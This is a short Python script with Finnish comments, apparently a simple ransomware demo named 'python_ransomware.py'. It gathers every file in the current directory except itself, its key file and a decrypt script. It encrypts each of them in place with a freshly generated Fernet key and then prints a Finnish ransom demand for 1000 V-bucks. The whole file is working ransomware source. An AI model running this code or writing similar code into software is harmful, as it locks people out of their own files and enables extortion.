
import os
from cryptography.fernet import Fernet
#Etsi tiedostoja

files = []

for file in os.listdir():
    #ransomware tiedoston nimi
    if file == "python_ransomware.py" or file == "thekey.key" or file == "decrypt.py":
            continue
    if os.path.isfile(file):
        files.append(file)



#avain
key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
             thekey.write(key)

for file in files:
        with open(file, "rb") as thefile:
                contents = thefile.read()
        contents_encrypted = Fernet(key).encrypt(contents)

        with open(file, "wb") as thefile:
            thefile.write(contents_encrypted)

print("Kaikki tiedostosi on salattu!! Anna minulle 1000 V-bucksia tai poistan ne!!!")

            
